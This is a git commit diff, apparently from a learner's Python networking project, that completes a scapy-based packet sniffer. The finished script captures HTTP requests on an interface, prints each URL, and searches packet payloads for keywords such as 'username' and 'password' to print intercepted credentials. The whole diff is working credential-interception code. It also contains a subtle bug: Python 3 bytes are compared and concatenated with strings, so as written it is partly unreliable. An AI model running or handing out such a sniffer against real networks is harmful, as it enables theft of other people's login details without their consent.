ddd4771a7d414ccfe443b1099c647e2fb7e35f76
kali <dongohago@mail.ru>
2022-09-23 15:33:03 -0400

    Sniffer has been completed

--- PythonNetworking/sniffer.py
+++ PythonNetworking/sniffer.py
@@ -1,12 +1,27 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 import scapy.all as scapy
 from scapy.layers import http
 
-def sniff(face):
-    scapy.sniff(iface=face, store=False, prn=process_sniffed_packet)
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=sniff_packet)
 
-def process_sniffed_packet(packet):
+def get_url_address(packet):
+    return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path
+
+def get_information(packet):
+    if packet.haslayer(scapy.Raw):
+        LoadingData = packet[scapy.Raw].load
+        keywords = ["username", "password", "user", "pass", "login"]
+        for element in keywords:
+            if element in LoadingData:
+                return LoadingData
+
+def sniff_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        print(packet)
+        URLaddress = get_url_address(packet)
+        print("[+] HTTP Request >> " + URLaddress)
+        login_information = get_information(packet)
+        if login_information:
+            print("\n\n\n[+] Username/password" + login_information + "\n\n\n")
 
 sniff("eth0")
